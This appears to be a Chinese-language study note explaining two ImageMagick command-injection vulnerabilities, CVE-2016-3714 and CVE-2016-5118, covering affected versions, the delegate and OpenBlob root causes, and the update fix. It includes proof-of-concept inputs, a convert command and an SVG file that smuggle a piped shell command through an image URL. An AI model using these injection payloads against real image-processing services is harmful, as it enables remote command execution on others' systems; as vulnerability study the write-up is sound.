ImageMagick命令执行漏洞

  

  

关于ImageMagick

    ImageMagick软件是用C语言编写的开源图形处理软件，可以用来读、写和处理超过90种的图片文件，包括流行的\*JPEG\*、\*GIF\*、 \*PNG\*、\*PDF\*等格式。使用它可以对图片进行切割、旋转、组合等多种特效的处理。ImageMagick软件被许多编程语言所支持，包括Perl，C++，PHP，Python和Ruby等，比如：php有IMagick、MagickWand for PHP 、phMagick等ImageMagick拓展库,java有JMagick,python有PythonMagick、Wand 等拓展库。还有一些直接的调用接口

ImageMagick漏洞搜集

    搜寻下ImageMagick的命令执行漏洞会发现有两个，一个是CVE-2016-3714 另一个是CVE-2016-5118 。更多ImageMagick漏洞请点地址 本来想这篇只学一个命令执行漏洞呢，后来一想还是两个都学习一下了。下面呢分别记录两个漏洞（先CVE-2016-3714，再CVE-2016-5118）。

CVE-2016-3714

1\. 漏洞信息：  
    CNNVD编号： CNNVD-201605-101  
    CVE编号：CVE-2016-3714

2. 漏洞描述：  
    ImageMagick 6.9.3-10之前版本和7.0.1-1之前7.x版本的多个编码器（EPHEMERAL，HTTPS，MVG，MSL，TEXT，SHOW，WIN，PLT中存在远程代码执行漏洞，该漏洞源于程序没有充分过滤用户传入的shell字符。攻击者可通过上传恶意的图像利用该漏洞执行任意代码，获取敏感信息。  

3.影响版本：  
    ImageMagick 6.9.3-10之前版本  
    ImageMagick 7.0.1-1之前7.x版本

4.漏洞分析：  
    ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的。

在ImageMagick的默认配置文件里可以看到所有的委托：etc/ImageMagick/delegates.xml漏洞公告涉及到多个编码器。

    此处以简短意用的https的委托为例分析：

```
1.  `<delegate decode=\"https\" command=\"&quot;wget&quot; -q -O &quot;%o&quot; &quot;https:%M&quot;\"/>"`
    
```

委托中comman=处定义了具体带入system()执行的命令:"wget" -q -O "%o" "https:%M"。%M被定义为输入的图片格式,也就是我们输入的url地址。

    但是由于只是做了简单的字符串拼接,所以我们可以将引号闭合后通过管道符带入其他命令,也就形成了命令注入。   

    在解析https图片时候，使用wget命令获取，imagemagick默认支持mvg图片格式，这种格式与svg格式类似，是以文本的形式写入矢量图的内容，这其中就包含了https处理的过程。

    在这个漏洞下就可以构造一个mvg格式的图片（文件扩展名可不为.mvg，内容为mvg格式即可），在imagemagik解析时候会根据内容识别为mvg图片。

5.闭合符号进行命令执行：

    需要对"https:%M"中的%M进行构造进行闭合。比如：https://example.com"|ls "-la就可以了。   

    那么执行命令就变成了：

```
1.  `"wget" -q -O "%o" " https://example.com"|ls "-la" `
    
```

    再明确点就类似：

```
1.  `wget -q -O a.mvg https://example.com | ls -la `
    
```

    本地漏洞测试命令：

```
1.  `convert 'https://example.com/image.jpg" | ls "-la' out.png `
    
```

    远程漏洞测试文件：

```
1.  `.svg格式：`
    
2.  `<?xml version="1.0" standalone="no"?>`
    
3.  `<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"`
    
4.  `"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>`
    
5.  `<svg width="640px" height="480px" version="1.1"`
    
6.  `xmlns="http://www.w3.org/2000/svg"; xmlns:xlink=`
    
7.  `"http://www.w3.org/1999/xlink";>`
    
8.  `<image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la"`
    
9.  `x="0" y="0" height="640px" width="480px"/>`
    
10.  `</svg>`
     
```

CVE-2016-5118

1\. 漏洞信息：  
    CNNVD编号：    CNNVD-201605-686  
    CVE编号：    CVE-2016-5118

2.漏洞描述：  
    GraphicsMagick（ImageMagick的一个分支版本） 1.3.24之前版本和ImageMagick的blob.c文件中的‘OpenBlob’函数中存在安全漏洞。远程攻击者可借助文件名开始的‘|’字符利用该漏洞执行shell代码。

3. 影响版本：  
    GraphicsMagick  1.3.24之前版本  
    ImageMagick所有版本

4.漏洞分析：

    第一眼看到这个漏洞描述感觉也是一脸懵逼：借助文件名开始的‘|’字符，文件名？看来这个漏洞要比CVE-2016-3714利用起来更简单。 所有版本的Graphicsmagick和ImageMagick都支持打开文件，当文件名的第一个字符为‘|’，则文件名会被传递给shell程序执行，导致（可能远程）代码执行。此漏洞存在于软件处理的核心代码中，影响会更广。

简单看一下github中的blob.c处的源码： 

![](../Images/7ba9d9ac78aa3dc2b70c39ebd35f167d.png)

    使用SanitizeString()函数对文件名进行过滤等处理操作，对函数返回值再进行file的open操作。

再看下SanitizeString()函数的白名单：

![](../Images/45278af712f6256e2a459b74c5880d53.png)

    这白名单做的，除了不可打印字符都在里面了，不出漏洞就奇怪了。所以在这个地方，如果文件名第一个字符为|，那么之后的字符串就会被shell当做系统命令来执行。

    这个漏洞本地测试没有实现，本想建立名为|ls的文件用convert命令带入验证漏洞，但linux本身shell执行时候就会把|识别出来，所以本地端无法测试，只能在有漏洞的web端验证。

5. 修复方法：  
    imagemagick更新版本很及时的，直接更新版本。
